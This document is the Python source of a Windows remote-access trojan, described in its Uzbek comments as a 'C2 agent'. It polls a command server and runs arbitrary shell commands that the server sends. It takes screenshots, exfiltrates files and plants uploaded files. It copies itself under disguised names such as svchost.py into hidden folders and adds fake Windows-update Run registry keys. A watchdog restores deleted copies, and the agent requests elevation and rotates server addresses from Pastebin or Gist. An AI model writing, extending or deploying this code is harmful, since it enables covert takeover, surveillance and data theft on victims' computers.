"""
Windows Agent - To'liq funksional Windows uchun C2 agent
Barcha Windows maxsus imkoniyatlari bilan
Multi-protocol, IP update, auto-reconnect
"""

import socket
import time
import json
import sys
import os
import platform
import subprocess
import base64
import threading
import ctypes
from datetime import datetime
import urllib.request
import urllib.error
import urllib.parse

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

try:
    from common.crypto import encrypt_message, decrypt_message
    from common.commands import CommandHandler
    from common.ip_updater import IPUpdater
except ImportError:
    print("⚠️ Common modullar topilmadi, asosiy funksiyalar bilan ishlaydi")
    CommandHandler = None
    IPUpdater = None


class WindowsAgent:
    """Windows uchun to'liq agent - Multi-protocol, IP update, Auto-reconnect"""
    
    def __init__(self, server_host, server_port=8000, use_encryption=True, protocol='http'):
        self.server_host = server_host
        self.server_port = server_port
        self.use_encryption = use_encryption
        self.protocol = protocol  # http, tcp, https
        self.session_id = None
        self.running = True
        
        # Fallback servers
        self.servers = [{'host': server_host, 'port': server_port, 'protocol': protocol}]
        self.current_server_index = 0
        
        # IP Updater
        self.ip_updater = IPUpdater() if IPUpdater else None
        self.last_ip_check = 0
        self.ip_check_interval = 300  # 5 minut
        
        # Reconnection
        self.retry_delay = 5  # sekund
        self.max_retries = 3
        self.connection_failed_count = 0
        
        # Command handler
        if CommandHandler:
            self.cmd_handler = CommandHandler()
        else:
            self.cmd_handler = None
        
        # Agent ID - unique identifier
        self.agent_id = self._generate_agent_id()
        
        # Heartbeat interval
        self.heartbeat_interval = 5  # sekund
        
        # Persistence
        self.persistence_enabled = False
        
        print(f"🖥️  Windows Agent ishga tushirildi")
        print(f"   Agent ID: {self.agent_id}")
        print(f"   Protocol: {protocol.upper()}")
        print(f"   Server: {server_host}:{server_port}")
        print(f"   Shifrlash: {'✅' if use_encryption else '❌'}")
        print(f"   Auto-reconnect: ✅")
        print(f"   IP Update: {'✅' if self.ip_updater else '❌'}")
    
    def _generate_agent_id(self):
        """Unique agent ID yaratish"""
        import uuid
        hostname = platform.node()
        username = os.getenv('USERNAME', 'unknown')
        return f"{hostname}_{username}_{uuid.uuid4().hex[:8]}"
    
    def add_fallback_server(self, host, port=8000, protocol='http'):
        """Fallback server qo'shish"""
        self.servers.append({'host': host, 'port': port, 'protocol': protocol})
        print(f"➕ Fallback server qo'shildi: {protocol}://{host}:{port}")
    
    def add_ip_update_source(self, source_type, url):
        """IP update source qo'shish
        
        Args:
            source_type: 'github_gist', 'pastebin', 'custom'
            url: URL manzil
        """
        if not self.ip_updater:
            print("⚠️ IP Updater mavjud emas")
            return
        
        if source_type == 'github_gist':
            self.ip_updater.add_github_gist(url)
        elif source_type == 'pastebin':
            self.ip_updater.add_pastebin(url)
        elif source_type == 'custom':
            self.ip_updater.add_custom_url(url)
        
        print(f"➕ IP update source qo'shildi: {source_type}")
    
    def check_for_ip_updates(self):
        """IP update bormi tekshirish"""
        if not self.ip_updater:
            return
        
        current_time = time.time()
        
        # Vaqti kelmagan bo'lsa skip
        if current_time - self.last_ip_check < self.ip_check_interval:
            return
        
        self.last_ip_check = current_time
        
        print("🔍 IP update tekshirilmoqda...")
        
        try:
            updated_ips = self.ip_updater.get_updated_ips()
            
            if updated_ips:
                print(f"✅ {len(updated_ips)} ta yangi IP topildi")
                
                # Yangi IP larni qo'shish
                for ip in updated_ips:
                    # Agar IP allaqachon bo'lmasa
                    if not any(s['host'] == ip for s in self.servers):
                        self.add_fallback_server(ip, self.server_port, self.protocol)
                        
        except Exception as e:
            print(f"⚠️ IP update xatosi: {e}")
    
    def _try_connect_server(self, server):
        """Bir serverga ulanishga harakat"""
        host = server['host']
        port = server['port']
        protocol = server.get('protocol', 'http')
        
        print(f"🔌 {protocol}://{host}:{port} ga ulanmoqda...")
        
        for attempt in range(self.max_retries):
            try:
                if protocol == 'tcp':
                    # TCP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((host, port))
                    sock.close()
                    return True
                else:
                    # HTTP/HTTPS - test request
                    url = f"{protocol}://{host}:{port}/api/agents/ping/"
                    req = urllib.request.Request(url, method='GET')
                    with urllib.request.urlopen(req, timeout=10) as response:
                        if response.status == 200:
                            return True
                
            except Exception as e:
                print(f"  ❌ Attempt {attempt + 1}/{self.max_retries}: {e}")
                if attempt < self.max_retries - 1:
                    time.sleep(2)
        
        return False
    
    def _select_working_server(self):
        """Ishlaydigan serverni topish"""
        print("\n🔎 Ishlaydigan server qidirilmoqda...")
        
        # IP update check
        self.check_for_ip_updates()
        
        # Barcha serverlarni sinash
        for i, server in enumerate(self.servers):
            if self._try_connect_server(server):
                self.current_server_index = i
                self.server_host = server['host']
                self.server_port = server['port']
                self.protocol = server.get('protocol', 'http')
                self.connection_failed_count = 0
                print(f"✅ Server topildi: {self.protocol}://{self.server_host}:{self.server_port}\n")
                return True
        
        print("❌ Hech bir serverga ulanib bo'lmadi!\n")
        return False
    
    def register(self):
        """Serverga ro'yxatdan o'tish - qayta urinish bilan"""
        while True:
            try:
                url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/register/"
                
                # System info
                info = self._get_full_system_info()
                
                payload = {
                    'agent_id': self.agent_id,
                    'hostname': platform.node(),
                    'platform': 'Windows',
                    'os_version': platform.version(),
                    'ip_address': self._get_local_ip(),
                    'protocol': self.protocol,
                    'system_info': info
                }
                
                # HTTP request
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(
                    url,
                    data=data,
                    headers={'Content-Type': 'application/json'},
                    method='POST'
                )
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    result = json.loads(response.read().decode())
                    self.session_id = result.get('session_id')
                    print(f"✅ Serverga ro'yxatdan o'tdik")
                    print(f"   Session ID: {self.session_id}")
                    self.connection_failed_count = 0
                    return True
                    
            except Exception as e:
                print(f"❌ Ro'yxatdan o'tishda xato: {e}")
                self.connection_failed_count += 1
                
                # Boshqa serverga o'tish
                if self.connection_failed_count >= self.max_retries:
                    print(f"⚠️ {self.max_retries} marta urinish muvaffaqiyatsiz")
                    if not self._select_working_server():
                        print(f"⏳ {self.retry_delay} sekund kutilmoqda...")
                        time.sleep(self.retry_delay)
                        continue
                    # Yangi server bilan qayta urinish
                    self.connection_failed_count = 0
                else:
                    print(f"⏳ {self.retry_delay} sekund kutilmoqda...")
                    time.sleep(self.retry_delay)
    
    def heartbeat(self):
        """Server bilan aloqa va komanda olish - qayta urinish bilan"""
        try:
            # IP update check (background)
            self.check_for_ip_updates()
            
            url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/{self.agent_id}/heartbeat/"
            
            payload = {
                'agent_id': self.agent_id,
                'status': 'active',
                'protocol': self.protocol,
                'timestamp': datetime.now().isoformat()
            }
            
            data = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(
                url,
                data=data,
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                result = json.loads(response.read().decode())
                
                # Ulanish tiklandi
                if self.connection_failed_count > 0:
                    print("✅ Ulanish tiklandi!")
                    self.connection_failed_count = 0
                
                # Komanda bormi tekshirish
                if 'commands' in result and result['commands']:
                    for cmd in result['commands']:
                        self._execute_command(cmd)
                        
        except Exception as e:
            print(f"⚠️ Heartbeat xatosi: {e}")
            self.connection_failed_count += 1
            
            # Agar ko'p marta xato bo'lsa, boshqa serverga o'tish
            if self.connection_failed_count >= self.max_retries:
                print(f"❌ {self.max_retries} marta urinish muvaffaqiyatsiz")
                print("🔄 Boshqa serverga o'tilmoqda...")
                
                # Keyingi serverni tanlash
                self.current_server_index = (self.current_server_index + 1) % len(self.servers)
                next_server = self.servers[self.current_server_index]
                
                self.server_host = next_server['host']
                self.server_port = next_server['port']
                self.protocol = next_server.get('protocol', 'http')
                
                print(f"🔌 Yangi server: {self.protocol}://{self.server_host}:{self.server_port}")
                
                # Qayta ro'yxatdan o'tish
                self.connection_failed_count = 0
                self.register()
    
    def _execute_command(self, command):
        """Komandani bajarish"""
        try:
            cmd_type = command.get('type', '').lower()
            cmd_data = command.get('data', '')
            
            print(f"📥 Komanda: {cmd_type}")
            
            # Command handler bilan
            if self.cmd_handler:
                result = self.cmd_handler.handle_command(command)
            else:
                # Asosiy komandalar
                if cmd_type == 'sysinfo':
                    result = self._get_full_system_info()
                elif cmd_type == 'exec':
                    result = self._execute_shell(cmd_data)
                elif cmd_type == 'screenshot':
                    result = self._take_screenshot()
                elif cmd_type == 'download':
                    result = self._download_file(cmd_data)
                elif cmd_type == 'upload':
                    result = self._upload_file(cmd_data)
                elif cmd_type == 'persist':
                    result = self._enable_persistence()
                elif cmd_type == 'elevate':
                    result = self._check_admin_and_elevate()
                else:
                    result = {'error': f'Noma\'lum komanda: {cmd_type}'}
            
            # Natijani serverga yuborish
            self._send_result(command.get('id'), result)
            
        except Exception as e:
            print(f"❌ Komanda bajarishda xato: {e}")
            self._send_result(command.get('id'), {'error': str(e)})
    
    def _get_full_system_info(self):
        """To'liq system info"""
        info = {
            'hostname': platform.node(),
            'platform': platform.platform(),
            'system': platform.system(),
            'version': platform.version(),
            'release': platform.release(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'username': os.getenv('USERNAME'),
            'userprofile': os.getenv('USERPROFILE'),
            'temp': os.getenv('TEMP'),
            'python_version': platform.python_version(),
            'current_directory': os.getcwd(),
            'is_admin': self._is_admin(),
            'local_ip': self._get_local_ip()
        }
        
        # Qo'shimcha Windows info
        try:
            # Disk info
            info['drives'] = self._get_drives()
            
            # Memory info
            import psutil
            mem = psutil.virtual_memory()
            info['memory'] = {
                'total': mem.total,
                'available': mem.available,
                'percent': mem.percent,
                'used': mem.used
            }
            info['cpu_count'] = psutil.cpu_count()
            info['cpu_percent'] = psutil.cpu_percent(interval=1)
            
            # Network interfaces
            info['network'] = {}
            for iface, addrs in psutil.net_if_addrs().items():
                info['network'][iface] = [
                    {'address': addr.address, 'family': str(addr.family)}
                    for addr in addrs
                ]
        except ImportError:
            pass
        
        return info
    
    def _is_admin(self):
        """Admin huquqlari bormi tekshirish"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def _get_local_ip(self):
        """Local IP olish"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def _get_drives(self):
        """Barcha disk haydovchilarni olish"""
        drives = []
        for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            drive = f'{letter}:\\'
            if os.path.exists(drive):
                try:
                    import psutil
                    usage = psutil.disk_usage(drive)
                    drives.append({
                        'letter': letter,
                        'path': drive,
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free,
                        'percent': usage.percent
                    })
                except:
                    drives.append({'letter': letter, 'path': drive})
        return drives
    
    def _execute_shell(self, command):
        """Shell komanda bajarish"""
        try:
            # PowerShell yoki CMD
            if command.strip().startswith('powershell'):
                # PowerShell komanda
                cmd = command
            else:
                # CMD komanda
                cmd = f'cmd /c {command}'
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': True,
                'command': command,
                'returncode': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Timeout (30s)'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _take_screenshot(self):
        """Screenshot olish"""
        try:
            from PIL import ImageGrab
            import io
            
            # Screenshot
            screenshot = ImageGrab.grab()
            
            # BytesIO ga saqlash
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            
            # Base64 encode
            img_base64 = base64.b64encode(img_bytes.read()).decode()
            
            return {
                'success': True,
                'screenshot': img_base64,
                'size': len(img_base64),
                'timestamp': datetime.now().isoformat()
            }
        except ImportError:
            return {'success': False, 'error': 'Pillow kutubxonasi kerak (pip install pillow)'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _download_file(self, file_path):
        """Faylni serverga yuborish (download from agent)"""
        try:
            if not os.path.exists(file_path):
                return {'success': False, 'error': 'Fayl topilmadi'}
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Base64 encode
            file_base64 = base64.b64encode(file_data).decode()
            
            return {
                'success': True,
                'filename': os.path.basename(file_path),
                'path': file_path,
                'size': len(file_data),
                'data': file_base64
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _upload_file(self, data):
        """Faylni agentga yuklash (upload to agent)"""
        try:
            filename = data.get('filename')
            file_data = data.get('data')  # Base64
            path = data.get('path', os.getcwd())
            
            # Decode
            file_bytes = base64.b64decode(file_data)
            
            # Saqlash
            full_path = os.path.join(path, filename)
            with open(full_path, 'wb') as f:
                f.write(file_bytes)
            
            return {
                'success': True,
                'path': full_path,
                'size': len(file_bytes)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _enable_persistence(self):
        """Windows startup ga qo'shish (persistence) + Self-replication"""
        try:
            import winreg
            import shutil
            
            # Python script path
            script_path = os.path.abspath(sys.argv[0])
            python_exe = sys.executable
            
            # 5 ta joyga nusxa yaratish
            locations = [
                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'system32.py'),
                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'svchost.py'),
                os.path.join(os.getenv('TEMP'), 'WinUpdate.py'),
                os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Temp', 'winlogon.py'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'services.py') if os.path.exists(os.getenv('PROGRAMDATA', '')) else os.path.join(os.getenv('TEMP'), 'services.py')
            ]
            
            copied_locations = []
            
            # Har bir joyga nusxa ko'chirish
            for loc in locations:
                try:
                    # Directory yaratish
                    os.makedirs(os.path.dirname(loc), exist_ok=True)
                    
                    # Nusxa ko'chirish
                    if not os.path.exists(loc) or os.path.getsize(loc) != os.path.getsize(script_path):
                        shutil.copy2(script_path, loc)
                        copied_locations.append(loc)
                        
                        # Hidden attribute (Windows)
                        try:
                            ctypes.windll.kernel32.SetFileAttributesW(loc, 2)  # FILE_ATTRIBUTE_HIDDEN
                        except:
                            pass
                except Exception as e:
                    print(f"⚠️ Nusxa yaratishda xato ({loc}): {e}")
            
            # Registry ga har birini qo'shish
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            registry_names = [
                "WindowsUpdateService",
                "SystemHostService", 
                "WindowsSecurityUpdate",
                "WindowsLogonService",
                "MicrosoftServices"
            ]
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                
                for i, loc in enumerate(locations):
                    if os.path.exists(loc):
                        startup_cmd = f'"{python_exe}" "{loc}"'
                        winreg.SetValueEx(key, registry_names[i], 0, winreg.REG_SZ, startup_cmd)
                
                winreg.CloseKey(key)
            except Exception as e:
                print(f"⚠️ Registry xatosi: {e}")
            
            # Watchdog thread ishga tushirish
            self._start_watchdog(locations)
            
            self.persistence_enabled = True
            
            return {
                'success': True,
                'message': 'Persistence + Self-replication enabled',
                'locations': locations,
                'copied': len(copied_locations),
                'registry_entries': len(registry_names)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _start_watchdog(self, locations):
        """Watchdog - o'chirilgan nusxalarni qayta yaratish"""
        def watchdog_thread():
            script_path = os.path.abspath(sys.argv[0])
            
            while self.running:
                try:
                    time.sleep(30)  # Har 30 sekundda check
                    
                    for loc in locations:
                        # Agar fayl yo'q yoki o'zgargan bo'lsa
                        if not os.path.exists(loc) or os.path.getsize(loc) != os.path.getsize(script_path):
                            try:
                                # Directory yaratish
                                os.makedirs(os.path.dirname(loc), exist_ok=True)
                                
                                # Qayta yaratish
                                import shutil
                                shutil.copy2(script_path, loc)
                                
                                # Hidden
                                try:
                                    ctypes.windll.kernel32.SetFileAttributesW(loc, 2)
                                except:
                                    pass
                                
                                print(f"🔄 Qayta yaratildi: {loc}")
                                
                            except Exception as e:
                                pass
                                
                except Exception as e:
                    pass
        
        # Background thread
        watchdog = threading.Thread(target=watchdog_thread, daemon=True)
        watchdog.start()
    
    def _check_admin_and_elevate(self):
        """Admin huquqlarini tekshirish va olishga harakat"""
        if self._is_admin():
            return {'success': True, 'message': 'Allaqachon admin', 'is_admin': True}
        
        try:
            # UAC elevation
            import ctypes
            
            # Script path
            script_path = os.path.abspath(sys.argv[0])
            
            # Elevation
            ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",
                sys.executable,
                script_path,
                None,
                1  # SW_NORMAL
            )
            
            return {
                'success': True,
                'message': 'Elevation so\'ralmoqda',
                'is_admin': False
            }
        except Exception as e:
            return {'success': False, 'error': str(e), 'is_admin': False}
    
    def _send_result(self, command_id, result):
        """Komanda natijasini serverga yuborish"""
        max_send_retries = 3
        for attempt in range(max_send_retries):
            try:
                url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/{self.agent_id}/result/"
                
                payload = {
                    'agent_id': self.agent_id,
                    'command_id': command_id,
                    'result': result,
                    'timestamp': datetime.now().isoformat()
                }
                
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(
                    url,
                    data=data,
                    headers={'Content-Type': 'application/json'},
                    method='POST'
                )
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    print(f"✅ Natija yuborildi")
                    return
                    
            except Exception as e:
                print(f"⚠️ Natija yuborishda xato (attempt {attempt + 1}/{max_send_retries}): {e}")
                if attempt < max_send_retries - 1:
                    time.sleep(2)
    
    def run(self):
        """Agentni ishga tushirish - auto-reconnect bilan"""
        print(f"\n🚀 Agent ishga tushirildi")
        print(f"   Servers: {len(self.servers)} ta")
        print(f"   Heartbeat: har {self.heartbeat_interval}s")
        print(f"   Auto-reconnect: ✅")
        print(f"   Ctrl+C - to'xtatish\n")
        
        try:
            while self.running:
                # Ro'yxatdan o'tish (auto-reconnect)
                self.register()
                
                # Heartbeat loop
                consecutive_errors = 0
                while self.running:
                    try:
                        self.heartbeat()
                        consecutive_errors = 0  # Reset on success
                        time.sleep(self.heartbeat_interval)
                    except KeyboardInterrupt:
                        raise
                    except Exception as e:
                        consecutive_errors += 1
                        print(f"❌ Heartbeat loop xatosi ({consecutive_errors}): {e}")
                        
                        # Agar 5 marta ketma-ket xato bo'lsa, qayta ro'yxatdan o'tish
                        if consecutive_errors >= 5:
                            print("⚠️ Ko'p xato, qayta ro'yxatdan o'tilmoqda...")
                            break
                        
                        time.sleep(self.retry_delay)
                        
        except KeyboardInterrupt:
            print("\n\n⏹️  Agent to'xtatildi")
        except Exception as e:
            print(f"\n❌ Fatal xato: {e}")
            print("🔄 5 sekunddan keyin qayta ishga tushiriladi...")
            time.sleep(5)
            self.run()  # Recursive restart


def main():
    """Main funksiya"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Windows C2 Agent - Multi-protocol, Auto-reconnect')
    parser.add_argument('server', help='Server URL (http://127.0.0.1:8000) yoki IP')
    parser.add_argument('--port', type=int, default=8000, help='Server port (default: 8000)')
    parser.add_argument('--protocol', choices=['http', 'https', 'tcp'], default='http', 
                        help='Protokol turi (default: http)')
    parser.add_argument('--interval', type=int, default=5, help='Heartbeat interval (sekund)')
    parser.add_argument('--persist', action='store_true', help='Persistence yoqish (startup)')
    parser.add_argument('--no-encrypt', action='store_true', help='Shifrlashni o\'chirish')
    
    # Fallback servers
    parser.add_argument('--fallback', nargs='+', help='Fallback serverlar (IP:PORT:PROTOCOL)')
    
    # IP update sources
    parser.add_argument('--gist', help='GitHub Gist URL (IP update uchun)')
    parser.add_argument('--pastebin', help='Pastebin Raw URL (IP update uchun)')
    parser.add_argument('--custom-url', help='Custom URL (IP update uchun)')
    
    args = parser.parse_args()
    
    # Server URL parse
    server_url = args.server
    if server_url.startswith('http://') or server_url.startswith('https://'):
        # URL dan host olish
        from urllib.parse import urlparse
        parsed = urlparse(server_url)
        server_host = parsed.hostname
        server_port = parsed.port or args.port
        protocol = parsed.scheme
    else:
        # Faqat IP
        server_host = server_url
        server_port = args.port
        protocol = args.protocol
    
    # Agent yaratish
    agent = WindowsAgent(
        server_host=server_host,
        server_port=server_port,
        protocol=protocol,
        use_encryption=not args.no_encrypt
    )
    
    agent.heartbeat_interval = args.interval
    
    # Fallback servers
    if args.fallback:
        for fb in args.fallback:
            parts = fb.split(':')
            if len(parts) >= 2:
                fb_host = parts[0]
                fb_port = int(parts[1])
                fb_protocol = parts[2] if len(parts) > 2 else 'http'
                agent.add_fallback_server(fb_host, fb_port, fb_protocol)
    
    # IP update sources
    if args.gist:
        agent.add_ip_update_source('github_gist', args.gist)
    if args.pastebin:
        agent.add_ip_update_source('pastebin', args.pastebin)
    if args.custom_url:
        agent.add_ip_update_source('custom', args.custom_url)
    
    # Persistence
    if args.persist:
        result = agent._enable_persistence()
        if result['success']:
            print(f"✅ Persistence enabled: {result['registry_key']}\n")
        else:
            print(f"⚠️ Persistence xatosi: {result['error']}\n")
    
    # Ishga tushirish
    agent.run()


if __name__ == '__main__':
    main()
